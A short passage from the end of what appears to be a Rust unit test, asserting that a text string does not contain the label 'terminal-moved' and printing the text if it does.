    assert!(!text.contains("terminal-moved"), "{text}");
}
